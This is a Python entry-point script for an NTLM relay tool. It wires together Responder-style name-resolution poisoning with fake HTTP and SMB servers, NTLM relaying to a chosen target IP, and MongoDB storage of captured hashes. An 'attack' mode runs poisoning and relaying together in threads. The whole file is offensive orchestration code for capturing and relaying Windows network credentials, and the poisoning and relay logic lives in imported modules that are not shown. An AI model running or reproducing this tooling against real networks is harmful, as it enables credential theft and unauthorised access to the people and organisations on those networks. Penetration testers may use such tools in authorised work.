import warnings
from cryptography.utils import CryptographyDeprecationWarning
warnings.filterwarnings('ignore', category=CryptographyDeprecationWarning, message='.*TripleDES.*')
warnings.filterwarnings('ignore', category=CryptographyDeprecationWarning)

import argparse
import os
import sys
import logging
import ctypes
import time  # Add time import
from datetime import datetime
from scapy.all import get_if_list, conf
import subprocess
import threading # Add threading import

# Add the project root directory to Python path
project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
sys.path.insert(0, project_root)

from src.utils.hash_handler import process_ntlm_hash
from src.utils.packet_sniffer import start_capture
from src.modules.exploit.relay import Relay
from src.utils.mongo_handler import MongoDBHandler
from src.modules.capture.responder import ResponderCapture

def is_admin():
    """Check if the script is running with administrator privileges"""
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin

def list_interfaces():
    """List available network interfaces"""
    interfaces = get_if_list()
    print("\nAvailable interfaces:")
    for iface in interfaces:
        print(f"- {iface}")
    print("\nUsage example: --interface eth0")

def setup_logging():
    """Configure logging"""
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(module)s - %(message)s',
        handlers=[
            logging.FileHandler("ntlm_relay.log"),
            logging.StreamHandler()
        ]
    )
    return logging.getLogger(__name__)

def list_results(mongo_handler, logger):
    """List captured results from MongoDB"""
    try:
        results = mongo_handler.get_captures()
        if not results:
            logger.info("No captures found in database")
            return
        
        logger.info("\nCaptured Results:")
        for result in results:
            logger.info("-" * 50)
            for key, value in result.items():
                if key != '_id':
                    logger.info(f"{key}: {value}")
    except Exception as e:
        logger.error(f"Failed to list results: {str(e)}")

def run_poisoning(responder, logger):
    """Runs the poisoning process in a separate thread."""
    try:
        responder.start_poisoning()
        logger.info("Poisoning servers started.")
        logger.info(f"HTTP server running on port {responder.auth_ports['http']}")
        logger.info(f"SMB server running on port {responder.auth_ports['smb']}")
        # Keep thread alive while poisoning runs
        while getattr(threading.current_thread(), "do_run", True):
            time.sleep(1)
    except PermissionError:
        logger.error("Permission denied for poisoning. Try running with administrator privileges.")
    except Exception as e:
        logger.error(f"Error during poisoning: {str(e)}")
    finally:
        logger.info("Stopping poisoning servers...")
        responder.stop_poisoning()

def run_relaying(relay, logger):
    """Runs the relaying process in a separate thread."""
    try:
        relay.start_relay()
        logger.info("Relay server started.")
        # Keep thread alive while relaying runs
        while getattr(threading.current_thread(), "do_run", True):
            time.sleep(1)
    except Exception as e:
        logger.error(f"Error during relaying: {str(e)}")
    finally:
        logger.info("Stopping relay server...")
        relay.stop_relay()


def main():
    """Main entry point"""
    logger = setup_logging()

    parser = argparse.ArgumentParser(description='NTLM Relay Tool')
    # Add 'attack' command
    parser.add_argument('command', choices=['poison', 'relay', 'list', 'attack'], help='Command to execute')
    parser.add_argument('--interface', help='Network interface to use')
    parser.add_argument('--target', help='Target IP address for relay or attack mode')
    parser.add_argument('--debug', action='store_true', help='Enable debug logging')
    args = parser.parse_args()

    if args.debug:
        logger.setLevel(logging.DEBUG)
    
    # Initialize MongoDB
    mongo_db = None # Initialize to None
    try:
        mongo_db = MongoDBHandler()
        logger.info("MongoDB connection established")
    except Exception as e:
        logger.error(f"Failed to connect to MongoDB: {e}")
        # Allow continuing without DB for some commands if necessary, but attack needs it implicitly
        # return # Or handle differently depending on requirements

    poison_thread = None
    relay_thread = None
    responder = None
    relay = None

    try:
        if args.command == 'poison':
            if not args.interface:
                logger.error("Interface is required for poisoning mode")
                list_interfaces()
                return

            logger.info(f"Starting Responder poisoning on interface {args.interface}...")
            try:
                responder = ResponderCapture(interface=args.interface)
                responder.start_poisoning()
                logger.info("Poisoning servers started. Press Ctrl+C to stop.")
                logger.info(f"HTTP server running on port {responder.auth_ports['http']}")
                logger.info(f"SMB server running on port {responder.auth_ports['smb']}")
                while True:
                    time.sleep(1)
            except PermissionError:
                logger.error("Permission denied. Try running with administrator privileges.")
                return
            except KeyboardInterrupt:
                logger.info("Stopping poisoning servers...")
            except Exception as e:
                logger.error(f"Failed to start poisoning: {str(e)}")
            finally:
                 if responder:
                    responder.stop_poisoning()


        elif args.command == 'relay':
            if not args.interface:
                logger.error("Interface is required for relay mode")
                list_interfaces()
                return

            if not args.target:
                logger.error("Target IP is required for relay mode")
                return

            logger.info(f"Starting NTLM relay on interface {args.interface} targeting {args.target}...")
            try:
                relay = Relay(interface=args.interface)
                relay.set_target(args.target)
                relay.start_relay()
                logger.info("Relay server started. Press Ctrl+C to stop.")

                # Keep the main thread running
                try:
                    while True:
                        time.sleep(1)
                except KeyboardInterrupt:
                    logger.info("Stopping relay server...")

            except Exception as e:
                logger.error(f"Failed to start relay: {str(e)}")
            finally:
                if relay:
                    relay.stop_relay()

        elif args.command == 'list':
            if not mongo_db:
                logger.error("Cannot list results, MongoDB connection failed.")
                return
            list_results(mongo_db, logger)

        elif args.command == 'attack':
            if not args.interface:
                logger.error("Interface is required for attack mode")
                list_interfaces()
                return
            if not args.target:
                logger.error("Target IP is required for attack mode")
                return
            if not mongo_db:
                logger.error("Cannot start attack, MongoDB connection failed.")
                return


            logger.info(f"Starting Attack mode: Poisoning on {args.interface} and Relaying to {args.target}...")

            try:
                # Setup Responder
                responder = ResponderCapture(interface=args.interface)

                # Setup Relay
                relay = Relay(interface=args.interface)
                relay.set_target(args.target)

                # Start poisoning in a thread
                poison_thread = threading.Thread(target=run_poisoning, args=(responder, logger), daemon=True)
                poison_thread.do_run = True # Flag to control thread loop
                poison_thread.start()

                # Start relaying in a thread
                relay_thread = threading.Thread(target=run_relaying, args=(relay, logger), daemon=True)
                relay_thread.do_run = True # Flag to control thread loop
                relay_thread.start()

                logger.info("Attack mode initiated. Poisoning and Relaying are running concurrently. Press Ctrl+C to stop.")

                # Keep main thread alive
                while True:
                    # Check if threads are still alive
                    if not poison_thread.is_alive() or not relay_thread.is_alive():
                        logger.warning("One of the attack threads has stopped unexpectedly.")
                        break
                    time.sleep(1)

            except PermissionError:
                 logger.error("Permission denied. Try running with administrator privileges.")
            except KeyboardInterrupt:
                logger.info("Attack interrupted by user. Stopping services...")
            except Exception as e:
                logger.error(f"Failed to start attack mode: {str(e)}")
            finally:
                # Signal threads to stop
                if poison_thread:
                    poison_thread.do_run = False
                    # Wait briefly for thread to stop gracefully
                    poison_thread.join(timeout=2)
                if relay_thread:
                    relay_thread.do_run = False
                     # Wait briefly for thread to stop gracefully
                    relay_thread.join(timeout=2)
                logger.info("Attack mode finished.")


    except KeyboardInterrupt:
        logger.info("Exiting...")
    except Exception as e:
        logger.error(f"Unhandled error in main: {str(e)}")
    finally:
        # Ensure threads are stopped even if main loop exits unexpectedly
        if poison_thread and poison_thread.is_alive():
             poison_thread.do_run = False
             poison_thread.join(timeout=1)
        if relay_thread and relay_thread.is_alive():
             relay_thread.do_run = False
             relay_thread.join(timeout=1)

        if mongo_db:
            mongo_db.disconnect()
            logger.info("MongoDB connection closed.")


if __name__ == "__main__":
    if not is_admin():
        print("This script requires administrator privileges")
        sys.exit(1)
    main()